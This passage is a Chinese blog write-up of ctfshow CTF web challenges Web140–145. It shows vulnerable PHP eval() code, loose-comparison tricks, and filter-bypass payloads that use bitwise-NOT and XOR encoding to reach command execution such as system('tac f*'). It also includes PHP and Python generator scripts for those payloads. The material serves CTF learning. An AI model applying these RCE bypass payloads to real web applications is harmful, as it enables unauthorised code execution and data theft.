<p>出省题目，太出省了<br>这一题不能用tee和sed指令了，试一下tee就知道，没有写入的权限了<br>所以这一题用bash时间盲注<br>跑Web136的脚本<br>我 不得不吐槽一下这一题是真的出省，跑脚本会跑错的，我也不知道为啥，会蹦出几个奇怪字符</p>
<h2 id="Web140（常规操作）"><a href="#Web140（常规操作）" class="headerlink" title="Web140（常规操作）"></a>Web140（常规操作）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>到了web140了啊，这一题相对好理解<br>我们输入的f1,f2首先得包含数字或者是字母，然后如果满足<strong>intval($code) &#x3D;&#x3D; ‘ctfshow’</strong><br>就输出flag，看一下&#x3D;&#x3D;比较的真值表：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663123978757-052ee315-1f7e-406b-a75c-c4a70e94ed96.png#averageHue=%23e6e6e6&clientId=u8e5485bb-69d7-4&from=paste&id=u0f9fbbe6&name=image.png&originHeight=295&originWidth=1057&originalType=url&ratio=1&rotation=0&showTitle=false&size=34289&status=done&style=none&taskId=u27206300-97ae-4d9a-b281-0144aa093ad&title=" alt="image.png"><br>可以发现字符串等于0，所以“ctfshow”也就等于0，只需要<strong>intval($code) &#x3D;&#x3D;0</strong>即可<br>因此payload很多：</p>
<blockquote>
<p>md5(phpinfo())<br>md5(sleep())<br>md5(md5())<br>current(localeconv)<br>sha1(getcwd())     因为&#x2F;var&#x2F;www&#x2F;html md5后开头的数字所以我们改用sha1<br>bin2hex(bin2hex())</p>
</blockquote>
<h2 id="Web141（return命令执行-取反）"><a href="#Web141（return命令执行-取反）" class="headerlink" title="Web141（return命令执行+取反）"></a>Web141（return命令执行+取反）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这是一个典型的无字符数字rce<br>&#x2F;^\W+$&#x2F; 作用是匹配非数字字母下划线的字符<br>这里只可以输入非数字字母下划线的字符<br>无数字字母构造命令参考文章：<br>方法还是很多的，主要还是如何绕过return：<br><code>eval(&quot;return 1;phpinfo();&quot;);</code>这段代码是无法运行的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663133362876-ee0a1d2b-2df8-4fba-9728-3dc91a493add.png#averageHue=%23fefefe&clientId=u8e5485bb-69d7-4&from=paste&height=210&id=u0baffffa&name=image.png&originHeight=263&originWidth=908&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5791&status=done&style=none&taskId=ueeb2e708-c12f-41f2-a3b9-8a74c5bd848&title=&width=726.4" alt="image.png"><br>可以看到无反应，但是发现数字和命令可以参加运算的，这时候会触发：<br><code>eval(&quot;return 1-phpinfo();&quot;);</code>（这里的双引号必须要，否则报错）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663133598879-1b34facb-5a0a-48fe-b4b8-103aab19ecff.png#averageHue=%23b2caab&clientId=u8e5485bb-69d7-4&from=paste&height=200&id=u997c6e29&name=image.png&originHeight=250&originWidth=1677&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36715&status=done&style=none&taskId=u1ffed695-f605-4e56-9bc5-226a94b609f&title=&width=1341.6" alt="image.png"><br>利用这一点和上面的无字母数字构造指令，用以下php脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<p>利用取反去构造指令，取反就是二进制按位取反<br>先取反，然后输入的时候再取反，二次取反<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663133834474-a6d863a9-4ac1-49be-a7c0-90beaf11ce81.png#averageHue=%231d1b19&clientId=u8e5485bb-69d7-4&from=paste&height=94&id=u6ca3332b&name=image.png&originHeight=117&originWidth=646&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13122&status=done&style=none&taskId=uafc6a080-1d49-47d1-92c0-931874abb3c&title=&width=516.8" alt="image.png"><br>payload：?v1&#x3D;1&amp;v3&#x3D;-(<del>%8C%86%8C%8B%9A%92)(</del>%93%8C)&amp;v2&#x3D;-1<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663133881163-e0e99268-edad-432e-8147-b7729146ced8.png#averageHue=%23deb779&clientId=u8e5485bb-69d7-4&from=paste&height=282&id=u00869182&name=image.png&originHeight=352&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63937&status=done&style=none&taskId=ua5da6c2e-a20f-4745-bbe5-1d661563e36&title=&width=1536" alt="image.png"><br>成功运行，最后再构造指令show_source(‘flag.php’)<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663133917212-cb029fb0-8b83-4259-b8b6-f557acc58959.png#averageHue=%23191612&clientId=u8e5485bb-69d7-4&from=paste&height=75&id=u7765a97e&name=image.png&originHeight=94&originWidth=758&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14102&status=done&style=none&taskId=ue4c97f99-6208-476d-b0ad-f56c1193e5b&title=&width=606.4" alt="image.png"><br>payload:?v1&#x3D;1&amp;v3&#x3D;-(<del>%8C%97%90%88%A0%8C%90%8A%8D%9C%9A)(</del>%99%93%9E%98%D1%8F%97%8F)&amp;v2&#x3D;-1<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663133949956-bfa39901-51c6-45d7-a00b-07790fa4a986.png#averageHue=%23656564&clientId=u8e5485bb-69d7-4&from=paste&height=254&id=ucf8d24ee&name=image.png&originHeight=318&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40997&status=done&style=none&taskId=u69dca640-a01a-437b-8319-82bc3444b5c&title=&width=1536" alt="image.png"></p>
<h2 id="Web142（常规操作）"><a href="#Web142（常规操作）" class="headerlink" title="Web142（常规操作）"></a>Web142（常规操作）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>略微若知<br>payload：?v1&#x3D;0<br>就会sleep(0)立刻输出flag</p>
<h2 id="Web143（141plus）"><a href="#Web143（141plus）" class="headerlink" title="Web143（141plus）"></a>Web143（141plus）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题把上一题我们的解法ban了，不能用取反和自增，方法很多，我们用按位异或：<br>还是参考<br>写2个脚本，一个列出可用字符，一个进行处理：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);  <span class="comment">//新创建一个文件，也就是rce_or.txt，给他写的权限</span></span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>); <span class="comment">//ascii的前16个字符的十六进制应该是01，02，所以在前缀加‘0’</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);  <span class="comment">//前16个后面的就不用加0了</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);   <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);      <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> =<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;     <span class="comment">//如果有符合条件的就筛掉，输出空格</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;             <span class="comment">//可以使用的字符如下</span></span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;    <span class="comment">//十六进制前加百分号就变成了URL编码格式</span></span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));  <span class="comment">//urldecode函数是解URL编码，把他们变成字符串，这里是字符串进行按位或运算，按位或运算后，可以得到新的字符，如%21和%00进行按位或就变成了!,这样我们就可以使用感叹号,就类似于合成新的字符</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;          <span class="comment">//ord函数是将字符变成ASCII码</span></span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;     <span class="comment">//每次到这里都写入刚刚建立的文本内</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>都是可以改的，把按位异或可以改成，按位与，按位或都可以，视情况而变</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in arg:</span><br><span class="line">        f = <span class="title function_ invoke__">open</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            t = f.<span class="title function_ invoke__">readline</span>()  <span class="comment"># 逐行读取文件 //每一次循环，指针都会指向下一行，输出下一行的字符</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:  <span class="comment"># 读到空，即读完跳出循环</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:  <span class="comment"># 就比如我们这边输入的arg是system，当文本当前行第一个字母是s或者y这些字符就写入s1,s2</span></span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]  <span class="comment"># 提取第一个字符串，具体可以看上面我的截图，如第一行的%00</span></span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]  <span class="comment"># 提取第二个字符串</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.<span class="title function_ invoke__">close</span>()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span>  <span class="comment"># s1和s2进行或运算就可以合成对应的字母s,y,s,t,e,m</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = <span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function:&quot;</span>)) + <span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command:&quot;</span>))</span><br><span class="line"><span class="keyword">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后直接运行即可：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663138339444-f58723fd-90ef-4336-a22b-15b98971f796.png#averageHue=%232e2d2c&clientId=u8e5485bb-69d7-4&from=paste&height=79&id=ufbe29d92&name=image.png&originHeight=99&originWidth=698&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10794&status=done&style=none&taskId=u0b70c1e7-195f-435a-8e29-f077300cb68&title=&width=558.4" alt="image.png"><br>payload：<br>?v1&#x3D;1&amp;v3&#x3D;<em>(“%0c%06%0c%0b%05%0d”^”%7f%7f%7f%7f%60%60”)(“%0c%0c”^”%60%7f”)&amp;v2&#x3D;-1<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663138383006-f88c4c33-574d-4bc6-ba8a-a17c00bfe326.png#averageHue=%23828281&clientId=u8e5485bb-69d7-4&from=paste&height=275&id=u0e2a9a19&name=image.png&originHeight=344&originWidth=1623&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47137&status=done&style=none&taskId=ub912ce00-0ad6-4c92-b626-cb10aecb216&title=&width=1298.4" alt="image.png"><br>再构造出system(‘tac f</em>)<br>payload:<br>?v1&#x3D;1&amp;v3&#x3D;*(“%0c%06%0c%0b%05%0d”^”%7f%7f%7f%7f%60%60”)(“%0b%01%03%00%06%00”^”%7f%60%60%20%60%2a”)&amp;v2&#x3D;-1<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663138433463-10a2ebaf-bc8a-4a9b-bbfc-68677a29d7ab.png#averageHue=%23e3bc79&clientId=u8e5485bb-69d7-4&from=paste&height=310&id=u7ef65338&name=image.png&originHeight=387&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71895&status=done&style=none&taskId=u55f2b090-c2c1-4f62-8bd6-01ca21c31ee&title=&width=1536" alt="image.png"></p>
<h2 id="Web144（143plus）"><a href="#Web144（143plus）" class="headerlink" title="Web144（143plus）"></a>Web144（143plus）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>感觉不如143<br>没有ban掉我们的取反功能<br>构造payload：system(‘tac f*’)<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663139502272-b4f49381-8b78-46af-b342-108a40caf153.png#averageHue=%231c1814&clientId=u055897a8-a278-4&from=paste&height=71&id=ubea76544&name=image.png&originHeight=89&originWidth=549&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12278&status=done&style=none&taskId=u97b85e25-cab4-4a23-8a96-05196c8170b&title=&width=439.2" alt="image.png"><br>payload:<br>?v1&#x3D;1&amp;v3&#x3D;1&amp;v2&#x3D;-(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5)<br>v3长度只可以是1，那就换个地方执行命令，让v2去执行命令<br>‘&#x2F;^\W+$&#x2F;‘的意思是只匹配数字字母下划线以外的字符，无字母数字RCE的题目</p>
<h2 id="Web145（web144plus）"><a href="#Web145（web144plus）" class="headerlink" title="Web145（web144plus）"></a>Web145（web144plus）</h2><p>plus了吗，好像确实有那么一点点</p>
